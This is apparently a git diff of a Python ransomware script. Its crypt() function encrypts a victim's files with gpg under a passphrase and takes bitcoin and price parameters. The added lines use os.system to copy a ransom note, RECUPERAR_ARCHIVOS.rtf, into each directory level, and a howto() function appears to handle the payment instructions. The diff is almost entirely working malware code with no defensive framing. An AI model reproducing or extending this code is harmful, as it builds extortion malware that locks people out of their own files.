@@ -57,6 +57,7 @@ def crypt(text, pwd, path, bitcoin, price,verif ):
 			except(ValueError):		
 				input_data = gpg.gen_key_input(key_type="RSA",key_length=1024,passphrase=pwd)
 				try:
+					print(i)
 					archivo = open(i,"rb")
                				data = archivo.read()
                				datacifrada = gpg.encrypt(data, pwd)
@@ -102,17 +103,44 @@ def crypt(text, pwd, path, bitcoin, price,verif ):
 			vari2= (vari.split('\\', 1 )[0])
 			vari3= vari2.split('/')
 			vari4=''
-
+			
 			vari4= (vari.split('\\'))
-			print (vari4)
-			#vari5= (vari4.split('\\'))
+			print(vari4)
 			for tex in vari3:
 				text0= (text0+tex+'\\')
 				if (verif != text0):
 					verif= text0
 					#Copy/Paste
-					#print("copy RECUPERAR_ARCHIVOS.rtf "+text0+vari4+'\\'+"RECUPERAR_ARCHIVOS.rtf")
-					#os.system("copy RECUPERAR_ARCHIVOS.rtf "+text0+vari4+'\\'+"RECUPERAR_ARCHIVOS.rtf")
+					try:
+						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\')
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\'+vari4[6]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
+						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\')
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\'+vari4[5]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
+						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\')
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\'+vari4[4]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
+						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\')
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\'+vari4[3]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
+						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\')
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\'+vari4[2]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
+					try:
+						print("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\')
+						os.system("copy RECUPERAR_ARCHIVOS.rtf " +text0+vari4[1]+'\\')
+					except (IOError, RuntimeError, TypeError, NameError, OSError, IndexError):
+						pass
 			#Return la lista de directorios
 			return l
 
@@ -165,8 +193,8 @@ def howto(l, bitcoin, price,verif):
 		if (verif != text0):
 			verif= text0
 			#Copy/Paste
-			#print("copy RECUPERAR_ARCHIVOS.rtf "+text0+vari4+'\\'+"RECUPERAR_ARCHIVOS.rtf")
-			#os.system("copy RECUPERAR_ARCHIVOS.rtf "+text0+vari4+'\\'+"RECUPERAR_ARCHIVOS.rtf")
+			#print("copy RECUPERAR_ARCHIVOS.rtf "+text0+vari4[0]+'\\'+"RECUPERAR_ARCHIVOS.rtf")
+			#os.system("copy RECUPERAR_ARCHIVOS.rtf "+text0+vari4[0]+'\\'+"RECUPERAR_ARCHIVOS.rtf")
 
 
 
